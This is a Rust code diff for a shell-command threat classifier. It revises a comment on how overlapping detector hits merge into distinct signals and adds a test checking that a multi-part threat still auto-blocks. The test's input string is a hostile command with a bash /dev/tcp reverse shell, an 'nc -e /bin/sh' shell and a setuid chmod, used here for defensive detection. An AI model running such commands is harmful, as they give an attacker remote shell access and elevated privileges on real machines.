@@ -351,9 +351,14 @@ fn combined_confidence(hits: &[(ClassifyResult, usize)]) -> f32 {
 /// two independent signals, so they collapse to a single span group.
 /// Their confidences still both feed `combined_confidence`; only the
 /// auto-Block ">= 2 distinct signals" guard uses this count. Spans
-/// are `[start, start + matched.len())`; `matched` may be trimmed
-/// shorter than the raw match, which only ever *over*-merges (the
-/// safe direction — fewer distinct signals → less likely to Block).
+/// are `[start, start + matched.len())`. `matched` is the raw match
+/// for most detectors, but a few store a transformed string (curl /
+/// atom hits `.trim()` → shorter; the npm hit appends the rest of the
+/// line → longer). Either way any inexactness only *over*-merges,
+/// which is the safe direction here: fewer distinct signals → LESS
+/// likely to auto-Block. A correlated command that drops below 2
+/// distinct still surfaces as Warn (combined confidence is unchanged)
+/// — auto-Block is an opt-in escalation, never the only protection.
 fn distinct_span_groups(hits: &[(ClassifyResult, usize)]) -> usize {
     if hits.is_empty() {
         return 0;
@@ -1294,6 +1299,33 @@ mod tests {
             r.verdict
         );
         assert!(r.confidence >= 0.9);
+    }
+
+    #[test]
+    fn multi_atom_threat_keeps_distinct_signals_and_still_blocks() {
+        // Guards the security direction of the distinct-signal change:
+        // a genuine multi-atom threat must NOT be down-counted below
+        // the >= 2 guard. The AtomMatcher is LeftmostLongest +
+        // non-overlapping (atom_matcher.rs), so atoms that co-occur as
+        // separate hits always have DISJOINT spans — distinct count
+        // equals raw count, no spurious collapse. (Cross-detector
+        // overlap, e.g. the curl-pipe regex + curl-fsSL atom, is the
+        // only case that collapses — covered by the fsSL test above.)
+        let c = Classifier::new();
+        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x";
+        let raw = c.tier1.classify_all(cmd);
+        assert!(raw.len() >= 2, "expected multiple disjoint atom hits");
+        assert_eq!(
+            distinct_span_groups(&raw),
+            raw.len(),
+            "disjoint atom hits must each count as a distinct signal (no collapse)"
+        );
+        let r = c.with_block_threshold(Some(0.9)).classify(cmd);
+        assert!(
+            matches!(r.verdict, Verdict::Block),
+            "disjoint multi-atom threat must still auto-Block, got {:?}",
+            r.verdict
+        );
     }
 
     #[test]
